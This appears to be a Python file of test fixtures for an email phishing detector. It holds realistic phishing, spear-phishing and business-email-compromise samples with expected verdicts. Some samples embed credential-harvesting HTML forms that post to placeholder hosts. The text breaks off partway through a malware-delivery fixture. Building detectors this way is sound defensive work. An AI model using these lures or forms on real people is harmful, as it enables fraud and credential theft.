"""Reusable test email fixtures with expected verdicts.

Each fixture is a dict with:
  - label:    human-readable description
  - tags:     list of signal categories this email exercises
  - expected: verdict + score bounds the scorer should produce
  - email:    the raw email payload (matches the backend's EmailPayload schema)

Use ``build_email_data`` to convert a fixture's email dict into an
``EmailData`` domain object for engine tests.
"""

from __future__ import annotations

from datetime import datetime
from typing import Any

from detection_engine import Attachment, EmailData, EmailHeaders, Verdict


# ---------------------------------------------------------------------------
# Converter — dict → EmailData
# ---------------------------------------------------------------------------

def build_email_data(fixture: dict[str, Any]) -> EmailData:
    """Build an EmailData from a fixture dict."""
    header_pairs = [(h["name"], h["value"]) for h in fixture.get("headers", [])]
    attachments = tuple(
        Attachment(
            filename=a["filename"],
            mime_type=a["mime_type"],
            size_bytes=a["size_bytes"],
            sha256=a.get("sha256"),
        )
        for a in fixture.get("attachments", [])
    )
    raw_date = fixture.get("date")
    date = datetime.fromisoformat(raw_date) if raw_date else None

    return EmailData(
        message_id=fixture["message_id"],
        sender_address=fixture["sender_address"],
        sender_display_name=fixture.get("sender_display_name", ""),
        recipient=fixture["recipient"],
        subject=fixture["subject"],
        body_text=fixture.get("body_text", ""),
        body_html=fixture.get("body_html", ""),
        reply_to_address=fixture.get("reply_to_address", ""),
        return_path_address=fixture.get("return_path_address", ""),
        headers=EmailHeaders(header_pairs),
        attachments=attachments,
        date=date,
    )


# ---------------------------------------------------------------------------
# Helper: build an email dict with sensible defaults
# ---------------------------------------------------------------------------

def _email(
    *,
    message_id: str,
    sender_address: str,
    sender_display_name: str = "",
    recipient: str = "user@example.com",
    subject: str = "",
    date: str = "2026-05-01T12:00:00+00:00",
    body_text: str = "",
    body_html: str = "",
    reply_to_address: str = "",
    return_path_address: str = "",
    headers: list[dict[str, str]] | None = None,
    attachments: list[dict[str, Any]] | None = None,
) -> dict[str, Any]:
    email: dict[str, Any] = {
        "message_id": message_id,
        "sender_address": sender_address,
        "sender_display_name": sender_display_name,
        "recipient": recipient,
        "subject": subject,
        "date": date,
        "body_text": body_text,
        "body_html": body_html,
        "reply_to_address": reply_to_address,
        "return_path_address": return_path_address,
        "headers": headers or [],
    }
    if attachments:
        email["attachments"] = attachments
    return email


# ═══════════════════════════════════════════════════════════════════════════
#  1. PHISHING — MASS / COMMODITY
# ═══════════════════════════════════════════════════════════════════════════

MASS_PHISHING_PAYPAL = {
    "label": "Mass phishing — spoofed PayPal, auth fail, IP URL, urgency",
    "tags": ["spoofed_sender", "auth_fail", "ip_url", "urgency", "threat", "credential_ask"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-001",
        sender_address="security@paypa1-support.com",
        sender_display_name="PayPal Security",
        recipient="victim@example.com",
        subject="Your account has been limited - Immediate action required",
        date="2026-05-01T10:00:00+00:00",
        body_text=(
            "Dear Customer,\n\n"
            "We have detected unusual activity on your account. "
            "Your account will be suspended within 24 hours unless you verify "
            "your identity immediately.\n\n"
            "Click here to verify: http://192.168.1.100/verify-account\n\n"
            "If you do not respond, your account will be permanently closed.\n\n"
            "PayPal Security Team"
        ),
        body_html=(
            "<html><body>"
            "<p>Dear Customer,</p>"
            "<p>We have detected unusual activity on your account. "
            "Your account will be <b>suspended within 24 hours</b> unless you "
            "verify your identity immediately.</p>"
            '<p><a href="http://192.168.1.100/verify-account">'
            "Click here to verify your account</a></p>"
            "<p>If you do not respond, your account will be permanently closed.</p>"
            "<p>PayPal Security Team</p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "security@paypa1-support.com"},
            {"name": "To", "value": "victim@example.com"},
            {"name": "Received", "value": (
                "from unknown (HELO mail.paypa1-support.com) (45.33.22.11) "
                "by mx.example.com with SMTP; 01 May 2026 10:00:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=paypa1-support.com; "
                "dkim=fail header.d=paypa1-support.com; dmarc=fail header.from=paypa1-support.com"
            )},
        ],
        return_path_address="bounce-999@cheap-mailer.xyz",
    ),
}

MASS_PHISHING_MICROSOFT = {
    "label": "Mass phishing — Microsoft 365 password expiry, shortened URL",
    "tags": ["spoofed_sender", "auth_fail", "urgency", "credential_ask"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-002",
        sender_address="admin@micros0ft-365.com",
        recipient="employee@company.com",
        subject="[Action Required] Your password expires today",
        date="2026-05-01T07:30:00+00:00",
        body_text=(
            "Your Microsoft 365 password will expire today.\n\n"
            "To avoid losing access to your email, files, and Teams, "
            "please update your password immediately:\n\n"
            "https://bit.ly/3xF4k3L\n\n"
            "If you have already changed your password, please disregard this message.\n\n"
            "Microsoft 365 Admin"
        ),
        body_html=(
            "<html><body>"
            '<div style="font-family:Segoe UI,sans-serif">'
            "<p>Your Microsoft 365 password will expire today.</p>"
            "<p>To avoid losing access to your email, files, and Teams, "
            "please update your password immediately:</p>"
            '<p><a href="https://bit.ly/3xF4k3L" '
            'style="background:#0078d4;color:white;padding:10px 20px;text-decoration:none">'
            "Update Password</a></p>"
            "</div></body></html>"
        ),
        headers=[
            {"name": "From", "value": "admin@micros0ft-365.com"},
            {"name": "To", "value": "employee@company.com"},
            {"name": "Authentication-Results", "value": (
                "mx.company.com; spf=fail smtp.mailfrom=micros0ft-365.com; "
                "dkim=none; dmarc=fail header.from=micros0ft-365.com"
            )},
        ],
        return_path_address="bounce@micros0ft-365.com",
    ),
}

PHISHING_BANK_HTML_FORM = {
    "label": "Phishing — embedded HTML form stealing credentials inline",
    "tags": ["spoofed_sender", "auth_fail", "html_form", "credential_ask", "urgency"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-003",
        sender_address="alerts@secure-bankofamerica.com",
        recipient="customer@example.com",
        subject="Verify your identity to restore access",
        date="2026-05-01T13:00:00+00:00",
        body_text="Please verify your identity. (See HTML version for form.)",
        body_html=(
            "<html><body>"
            "<h2>Bank of America Security Alert</h2>"
            "<p>We have temporarily limited your account. "
            "Please verify your identity below:</p>"
            '<form action="http://203.0.113.55/collect" method="POST">'
            '<label>Username:</label><input type="text" name="user"><br>'
            '<label>Password:</label><input type="password" name="pass"><br>'
            '<label>SSN (last 4):</label><input type="text" name="ssn"><br>'
            '<input type="submit" value="Verify Now">'
            "</form>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "alerts@secure-bankofamerica.com"},
            {"name": "To", "value": "customer@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=secure-bankofamerica.com; "
                "dkim=fail header.d=secure-bankofamerica.com; "
                "dmarc=fail header.from=secure-bankofamerica.com"
            )},
        ],
    ),
}

PHISHING_HIDDEN_URL = {
    "label": "Phishing — display text shows legit URL, href points elsewhere",
    "tags": ["spoofed_sender", "auth_fail", "ip_url", "credential_ask"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-004",
        sender_address="noreply@app1e-id.support",
        recipient="target@example.com",
        subject="Your Apple ID was used to sign in to a new device",
        date="2026-05-01T15:20:00+00:00",
        body_text=(
            "Your Apple ID was used to sign in to a new device.\n\n"
            "If this wasn't you, visit https://appleid.apple.com to secure your account."
        ),
        body_html=(
            "<html><body>"
            "<p>Your Apple ID was used to sign in to a new device.</p>"
            "<p>If this wasn't you, "
            '<a href="http://45.77.123.45/apple-id-verify">'
            "https://appleid.apple.com</a> to secure your account.</p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "noreply@app1e-id.support"},
            {"name": "To", "value": "target@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=softfail smtp.mailfrom=app1e-id.support; "
                "dkim=fail header.d=app1e-id.support; dmarc=fail header.from=app1e-id.support"
            )},
        ],
    ),
}


PHISHING_NETFLIX_PAYMENT_HOLD = {
    "label": "Mass phishing — Netflix billing hold, cousin domain, urgency, auth fail",
    "tags": ["spoofed_sender", "cousin_domain", "auth_fail", "urgency", "credential_ask"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-005",
        sender_address="billing@netflix-account-hold.com",
        sender_display_name="Netflix Billing",
        recipient="subscriber@example.com",
        subject="We're having trouble with your current billing information",
        date="2026-05-02T08:15:00+00:00",
        body_text=(
            "Hi,\n\n"
            "We were unable to validate your billing information for the next "
            "billing cycle of your subscription. Your account will be suspended "
            "within 24 hours unless you update your payment information.\n\n"
            "Please update your payment: https://netflix-account-hold.com/billing/restart\n\n"
            "Need help? We're here for you.\n\n"
            "— Netflix"
        ),
        body_html=(
            "<html><body style='font-family:Arial,sans-serif;color:#222'>"
            "<h2 style='color:#E50914'>NETFLIX</h2>"
            "<p>We were unable to validate your billing information.</p>"
            "<p><b>Your account will be suspended within 24 hours</b> unless you "
            "update your payment information.</p>"
            '<p><a href="https://netflix-account-hold.com/billing/restart" '
            'style="background:#E50914;color:#fff;padding:10px 18px;text-decoration:none;'
            'border-radius:4px">Restart Membership</a></p>'
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "Netflix <billing@netflix-account-hold.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=netflix-account-hold.com; "
                "dkim=fail header.d=netflix-account-hold.com; "
                "dmarc=fail header.from=netflix-account-hold.com"
            )},
        ],
    ),
}

PHISHING_FEDEX_DELIVERY_FEE = {
    "label": "Mass phishing — FedEx undelivered package + small fee, cousin domain, IP URL",
    "tags": ["spoofed_sender", "cousin_domain", "ip_url", "auth_fail", "urgency"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-006",
        sender_address="tracking@fedex-redelivery.com",
        sender_display_name="FedEx Delivery Services",
        recipient="recipient@example.com",
        subject="Action Required: Package #FX-77820 could not be delivered",
        date="2026-05-02T09:00:00+00:00",
        body_text=(
            "Dear customer,\n\n"
            "We attempted to deliver your package today but no one was available "
            "to receive it. A redelivery fee of $2.99 is required to schedule "
            "another attempt within 24 hours.\n\n"
            "Pay the fee and reschedule: http://198.51.100.61/fedex-redeliver\n\n"
            "FedEx Delivery Services"
        ),
        body_html=(
            "<html><body>"
            "<p><b>FedEx</b> Delivery Notification</p>"
            "<p>Tracking #FX-77820 — delivery attempt failed.</p>"
            '<p><a href="http://198.51.100.61/fedex-redeliver">Reschedule delivery</a></p>'
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "FedEx <tracking@fedex-redelivery.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=fedex-redelivery.com; "
                "dkim=none; dmarc=fail header.from=fedex-redelivery.com"
            )},
        ],
    ),
}

PHISHING_INSTAGRAM_LOGIN_ALERT = {
    "label": "Mass phishing — Instagram suspicious login, typosquat (1nstagram), credential ask",
    "tags": ["spoofed_sender", "cousin_domain", "auth_fail", "credential_ask"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-007",
        sender_address="security@1nstagram-help.com",
        sender_display_name="Instagram Security",
        recipient="user@example.com",
        subject="Suspicious login attempt — confirm it's you",
        date="2026-05-02T11:40:00+00:00",
        body_text=(
            "Hi,\n\n"
            "We detected a suspicious login attempt on your account from a new "
            "device in Lagos, Nigeria. If this wasn't you, please verify your "
            "password immediately to keep your account secure.\n\n"
            "Verify your account: https://1nstagram-help.com/login/verify\n\n"
            "— Instagram Security"
        ),
        body_html=(
            "<html><body>"
            "<h3>Instagram</h3>"
            "<p>We detected a suspicious login attempt.</p>"
            "<p>If this wasn't you, please verify your password immediately.</p>"
            '<p><a href="https://1nstagram-help.com/login/verify">Secure account</a></p>'
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "Instagram <security@1nstagram-help.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=1nstagram-help.com; "
                "dkim=fail header.d=1nstagram-help.com; "
                "dmarc=fail header.from=1nstagram-help.com"
            )},
        ],
    ),
}

PHISHING_DROPBOX_SHARED_FILE = {
    "label": "Mass phishing — fake Dropbox shared file, typosquat (dr0pbox), credential ask",
    "tags": ["spoofed_sender", "cousin_domain", "auth_fail", "credential_ask"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-008",
        sender_address="no-reply@dr0pbox-share.com",
        sender_display_name="Dropbox",
        recipient="colleague@targetcorp.com",
        subject="Sarah shared 'Q2_Forecast.xlsx' with you",
        date="2026-05-02T13:20:00+00:00",
        body_text=(
            "Sarah Mitchell shared a file with you on Dropbox.\n\n"
            "Q2_Forecast.xlsx (412 KB)\n\n"
            "Sign in to verify your account and view this file:\n"
            "https://dr0pbox-share.com/auth/login?next=q2-forecast\n\n"
            "Happy collaborating,\nThe Dropbox team"
        ),
        body_html=(
            "<html><body>"
            "<p><b>Dropbox</b></p>"
            "<p>Sarah shared <b>Q2_Forecast.xlsx</b> with you.</p>"
            '<p><a href="https://dr0pbox-share.com/auth/login?next=q2-forecast" '
            'style="background:#0061FF;color:#fff;padding:10px 18px;text-decoration:none">'
            "Sign in to view</a></p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "Dropbox <no-reply@dr0pbox-share.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=fail smtp.mailfrom=dr0pbox-share.com; "
                "dkim=fail header.d=dr0pbox-share.com; "
                "dmarc=fail header.from=dr0pbox-share.com"
            )},
        ],
    ),
}

PHISHING_IRS_TAX_REFUND = {
    "label": "Phishing — fake IRS tax refund from freemail, sensitive data ask",
    "tags": ["spoofed_sender", "freemail", "impersonation", "credential_ask", "urgency", "language_only"],
    # Auth passes (real gmail.com), sender is freemail (no cousin), no URLs,
    # no HTML form. The attack lives entirely in body language. Deterministic
    # analyzers correctly return SAFE; LanguageAssessmentAnalyzer is the
    # detection path for this pattern.
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="phish-009",
        sender_address="irs.refund.dept2026@gmail.com",
        sender_display_name="IRS Refund Department",
        recipient="taxpayer@example.com",
        subject="IRS Tax Refund — $1,247.83 ready for direct deposit",
        date="2026-05-02T07:10:00+00:00",
        body_text=(
            "INTERNAL REVENUE SERVICE\n"
            "Refund Notification\n\n"
            "Our records show that you are eligible for a federal tax refund of "
            "$1,247.83 for tax year 2025. To receive your refund, please verify "
            "your bank account details within 48 hours.\n\n"
            "Reply to this email with:\n"
            "  • Full name\n"
            "  • Social security number\n"
            "  • Bank routing and account number\n\n"
            "Failure to respond will result in forfeiture of the refund.\n\n"
            "IRS Refund Department"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "IRS Refund Department <irs.refund.dept2026@gmail.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=gmail.com; "
                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
            )},
        ],
    ),
}

PHISHING_LINKEDIN_INMAIL = {
    "label": "Mass phishing — fake LinkedIn InMail, typosquat (linked1n), credential ask",
    "tags": ["spoofed_sender", "cousin_domain", "auth_fail", "credential_ask"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-010",
        sender_address="messaging-noreply@linked1n-careers.com",
        sender_display_name="LinkedIn",
        recipient="member@example.com",
        subject="You have a new InMail from a recruiter",
        date="2026-05-02T16:00:00+00:00",
        body_text=(
            "Hi,\n\n"
            "A recruiter from a Fortune 500 company has sent you an InMail "
            "regarding a senior role. Sign in to verify your account and read "
            "the message:\n\n"
            "https://linked1n-careers.com/messages/inmail/8821\n\n"
            "— LinkedIn"
        ),
        body_html=(
            "<html><body>"
            "<p><b>LinkedIn</b></p>"
            "<p>You have a new InMail from a recruiter at a Fortune 500 company.</p>"
            '<p><a href="https://linked1n-careers.com/messages/inmail/8821">Read InMail</a></p>'
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "LinkedIn <messaging-noreply@linked1n-careers.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=linked1n-careers.com; "
                "dkim=fail header.d=linked1n-careers.com; "
                "dmarc=fail header.from=linked1n-careers.com"
            )},
        ],
    ),
}

PHISHING_CHASE_BANK_LOCKOUT = {
    "label": "Mass phishing — Chase bank lockout, cousin domain + IP URL + urgency",
    "tags": ["spoofed_sender", "cousin_domain", "ip_url", "auth_fail", "urgency", "credential_ask", "threat"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 80,
    },
    "email": _email(
        message_id="phish-011",
        sender_address="alerts@chase-online-secure.com",
        sender_display_name="Chase Online Banking",
        recipient="customer@example.com",
        subject="Your account has been locked due to unusual activity",
        date="2026-05-02T05:45:00+00:00",
        body_text=(
            "Dear Customer,\n\n"
            "We detected unauthorized activity on your Chase account. Your "
            "account has been locked. Please verify your identity immediately "
            "to restore access — failure to respond will result in permanent "
            "closure within 24 hours.\n\n"
            "Verify now: http://203.0.113.205/chase/secure-restore\n\n"
            "Chase Online Security"
        ),
        body_html=(
            "<html><body>"
            "<h2 style='color:#117ACA'>Chase</h2>"
            "<p>We detected unauthorized activity on your account.</p>"
            "<p><b>Your account has been locked</b>. Please verify your identity "
            "immediately or your account will be permanently closed within 24 hours.</p>"
            '<p><a href="http://203.0.113.205/chase/secure-restore" '
            'style="background:#117ACA;color:#fff;padding:10px 18px;text-decoration:none">'
            "Verify identity</a></p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "Chase <alerts@chase-online-secure.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=chase-online-secure.com; "
                "dkim=fail header.d=chase-online-secure.com; "
                "dmarc=fail header.from=chase-online-secure.com"
            )},
        ],
    ),
}

PHISHING_SPOTIFY_PAYMENT_FAILED = {
    "label": "Mass phishing — Spotify payment failure, typosquat (sp0tify), urgency",
    "tags": ["spoofed_sender", "cousin_domain", "auth_fail", "urgency"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-012",
        sender_address="no-reply@sp0tify-billing.com",
        sender_display_name="Spotify",
        recipient="listener@example.com",
        subject="We could not process your payment — update payment information",
        date="2026-05-02T19:30:00+00:00",
        body_text=(
            "Hi,\n\n"
            "Your last payment for Spotify Premium failed. To avoid service "
            "interruption, please update your payment information within 48 hours.\n\n"
            "Update payment: https://sp0tify-billing.com/account/payment\n\n"
            "Cheers,\nThe Spotify team"
        ),
        body_html=(
            "<html><body style='font-family:Arial,sans-serif;color:#191414'>"
            "<h2 style='color:#1DB954'>Spotify</h2>"
            "<p>Your last payment failed. <b>Service interruption</b> within 48 hours "
            "if not resolved.</p>"
            '<p><a href="https://sp0tify-billing.com/account/payment" '
            'style="background:#1DB954;color:#fff;padding:10px 18px;text-decoration:none;'
            'border-radius:20px">Update payment</a></p>'
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "Spotify <no-reply@sp0tify-billing.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=sp0tify-billing.com; "
                "dkim=fail header.d=sp0tify-billing.com; "
                "dmarc=fail header.from=sp0tify-billing.com"
            )},
        ],
    ),
}

PHISHING_DOCUSIGN_LOOKALIKE = {
    "label": "Mass phishing — fake DocuSign signature request with HTML form harvest",
    "tags": ["spoofed_sender", "auth_fail", "html_form", "credential_ask"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="phish-013",
        sender_address="alerts@docusign-secure-portal.com",
        sender_display_name="DocuSign",
        recipient="signer@targetcorp.com",
        subject="Please review and sign: Vendor Agreement #VA-2026-44871",
        date="2026-05-02T14:55:00+00:00",
        body_text="A document is awaiting your signature. (View HTML to sign.)",
        body_html=(
            "<html><body>"
            "<h3>DocuSign — Document for your signature</h3>"
            "<p>A vendor agreement is awaiting your signature.</p>"
            "<p>Confirm your identity to view and sign:</p>"
            '<form action="https://docusign-secure-portal.com/auth/collect" method="POST">'
            '<label>Email:</label><input type="text" name="email"><br>'
            '<label>Password:</label><input type="password" name="password"><br>'
            '<input type="submit" value="Continue to document">'
            "</form>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "DocuSign <alerts@docusign-secure-portal.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=fail smtp.mailfrom=docusign-secure-portal.com; "
                "dkim=fail header.d=docusign-secure-portal.com; "
                "dmarc=fail header.from=docusign-secure-portal.com"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  2. SPEAR PHISHING / TARGETED
# ═══════════════════════════════════════════════════════════════════════════

SPEAR_PHISH_COUSIN_DOMAIN = {
    "label": "Spear-phish — cousin domain (arnazon.com), auth passes, credential ask",
    "tags": ["cousin_domain", "auth_pass", "credential_ask", "urgency"],
    "expected": {
        "verdict_in": [Verdict.LIKELY_MALICIOUS, Verdict.MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="spear-001",
        sender_address="account-update@arnazon.com",
        sender_display_name="Amazon Customer Service",
        recipient="employee@targetcorp.com",
        subject="Action required: verify your payment method",
        date="2026-05-01T11:15:00+00:00",
        body_text=(
            "Dear valued customer,\n\n"
            "We were unable to process your most recent payment. "
            "To avoid service interruption, please update your payment "
            "information within 48 hours.\n\n"
            "Update now: https://arnazon.com/account/verify-payment\n\n"
            "If you believe this is an error, please contact our support team.\n\n"
            "Amazon Customer Service"
        ),
        body_html=(
            "<html><body>"
            "<p>Dear valued customer,</p>"
            "<p>We were unable to process your most recent payment. "
            "To avoid service interruption, please update your payment "
            "information within <b>48 hours</b>.</p>"
            '<p><a href="https://arnazon.com/account/verify-payment">'
            "Update your payment method</a></p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "account-update@arnazon.com"},
            {"name": "To", "value": "employee@targetcorp.com"},
            {"name": "Received", "value": (
                "from mail.arnazon.com (198.51.100.22) "
                "by mx.targetcorp.com with ESMTPS; 01 May 2026 11:15:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=arnazon.com; "
                "dkim=pass header.d=arnazon.com; dmarc=pass header.from=arnazon.com"
            )},
        ],
        return_path_address="bounce@arnazon.com",
    ),
}

SPEAR_PHISH_THREAD_HIJACK = {
    "label": "Thread hijack — RE: prefix on real subject, injected malicious link",
    "tags": ["thread_hijack", "auth_fail"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="spear-002",
        sender_address="partner@supp1ier-corp.com",
        recipient="procurement@targetcorp.com",
        subject="RE: Q2 Purchase Order #PO-2026-0892",
        date="2026-05-01T09:45:00+00:00",
        body_text=(
            "Hi,\n\n"
            "Sorry for the delay. I've uploaded the revised invoice to our "
            "secure portal. Please download and review:\n\n"
            "https://tinyurl.com/3xfake-invoice\n\n"
            "Let me know if the numbers look right.\n\n"
            "Best,\nDavid Chen\nSupplier Corp"
        ),
        headers=[
            {"name": "From", "value": "partner@supp1ier-corp.com"},
            {"name": "To", "value": "procurement@targetcorp.com"},
            {"name": "In-Reply-To", "value": "<original-thread-id@targetcorp.com>"},
            {"name": "References", "value": "<original-thread-id@targetcorp.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=fail smtp.mailfrom=supp1ier-corp.com; "
                "dkim=fail header.d=supp1ier-corp.com; dmarc=fail header.from=supp1ier-corp.com"
            )},
        ],
    ),
}

SPEAR_PHISH_HOMOGLYPH = {
    "label": "Spear-phish — Unicode homoglyph in display name (Cyrillic 'a')",
    "tags": ["homoglyph", "auth_pass", "credential_ask", "impersonation"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="spear-003",
        sender_address="it-support@targetcorp.com",
        recipient="employee@targetcorp.com",
        subject="IT Security: mandatory credential rotation",
        date="2026-05-01T08:00:00+00:00",
        body_text=(
            "Hi,\n\n"
            "As part of our quarterly security review, all employees must "
            "rotate their credentials by end of day.\n\n"
            "Please log in to the portal to update:\n"
            "https://sso.targetcorp.com/rotate\n\n"
            "— IT Support"
        ),
        headers=[
            {"name": "From", "value": "IT Support <it-support@tаrgetcorp.com>"},
            {"name": "To", "value": "employee@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=tаrgetcorp.com; "
                "dkim=pass header.d=tаrgetcorp.com; dmarc=pass header.from=tаrgetcorp.com"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  3. BUSINESS EMAIL COMPROMISE (BEC)
# ═══════════════════════════════════════════════════════════════════════════

BEC_WIRE_TRANSFER = {
    "label": "BEC — freemail CEO impersonation, wire transfer, secrecy (reply-to suppressed: freemail→freemail)",
    "tags": ["freemail", "impersonation", "wire_transfer", "secrecy", "urgency"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="bec-001",
        sender_address="john.smith.ceo@gmail.com",
        recipient="finance@acmecorp.com",
        subject="Urgent wire transfer needed",
        date="2026-05-01T14:00:00+00:00",
        body_text=(
            "Hi,\n\n"
            "I need you to process a wire transfer of $45,000 to a new vendor today. "
            "This is time-sensitive and confidential — please don't discuss it with "
            "anyone else until it's done.\n\n"
            "I'll send the account details shortly. Please confirm you can handle "
            "this right away.\n\n"
            "Thanks,\n"
            "John Smith\nCEO"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "john.smith.ceo@gmail.com"},
            {"name": "To", "value": "finance@acmecorp.com"},
            {"name": "Received", "value": (
                "from mail-sor-f41.google.com (209.85.220.41) "
                "by mx.acmecorp.com with ESMTPS; 01 May 2026 14:00:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.acmecorp.com; spf=pass smtp.mailfrom=gmail.com; "
                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
            )},
        ],
        reply_to_address="john.smith.ceo-payments@protonmail.com",
    ),
}

BEC_GIFT_CARDS = {
    "label": "BEC — boss impersonation requesting gift card purchase",
    "tags": ["freemail", "impersonation", "secrecy", "urgency"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="bec-002",
        sender_address="sarah.jones.vp@outlook.com",
        recipient="assistant@acmecorp.com",
        subject="Quick favor — need this done today",
        date="2026-05-01T16:00:00+00:00",
        body_text=(
            "Hey,\n\n"
            "Are you at your desk? I need you to pick up 5 Apple gift cards, "
            "$200 each, for a client appreciation event. I'm stuck in meetings "
            "all day so I can't do it myself.\n\n"
            "Buy them and send me photos of the backs (scratch off the codes). "
            "I'll reimburse you on the next expense report.\n\n"
            "Please keep this between us — it's a surprise.\n\n"
            "Thanks,\nSarah Jones, VP Operations"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "Sarah Jones <sarah.jones.vp@outlook.com>"},
            {"name": "To", "value": "assistant@acmecorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.acmecorp.com; spf=pass smtp.mailfrom=outlook.com; "
                "dkim=pass header.d=outlook.com; dmarc=pass header.from=outlook.com"
            )},
        ],
    ),
}

BEC_PAYROLL_DIVERSION = {
    "label": "BEC — employee impersonation requesting payroll bank change",
    "tags": ["freemail", "impersonation", "credential_ask"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "min_score": 0,
        "max_score": 35,
    },
    "email": _email(
        message_id="bec-003",
        sender_address="mike.williams.dev@gmail.com",
        recipient="hr@acmecorp.com",
        subject="Update my direct deposit info",
        date="2026-05-01T11:30:00+00:00",
        body_text=(
            "Hi HR team,\n\n"
            "I recently switched banks and need to update my direct deposit "
            "information before the next pay cycle. Here are my new details:\n\n"
            "Bank: First National\n"
            "Routing: 021000021\n"
            "Account: 123456789\n\n"
            "Can you please update this ASAP? The old account will be closed "
            "by Friday.\n\n"
            "Thanks,\nMike Williams\nSenior Developer"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "Mike Williams <mike.williams.dev@gmail.com>"},
            {"name": "To", "value": "hr@acmecorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.acmecorp.com; spf=pass smtp.mailfrom=gmail.com; "
                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  4. MALWARE DELIVERY
# ═══════════════════════════════════════════════════════════════════════════

MALWARE_DOUBLE_EXTENSION = {
    "label": "Malware delivery — double extension .pdf.exe, urgency",
    "tags": ["attachment_exe", "auth_fail", "urgency", "threat"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="malware-001",
        sender_address="invoices@billing-dept.xyz",
        recipient="accounts@targetcorp.com",
        subject="URGENT: Outstanding invoice #INV-2026-0451 attached",
        date="2026-05-01T16:45:00+00:00",
        body_text=(
            "Please find attached the overdue invoice for immediate payment.\n\n"
            "This invoice is past due. Failure to remit payment within 24 hours "
            "may result in service suspension.\n\n"
            "Regards,\nBilling Department"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "invoices@billing-dept.xyz"},
            {"name": "To", "value": "accounts@targetcorp.com"},
            {"name": "Received", "value": (
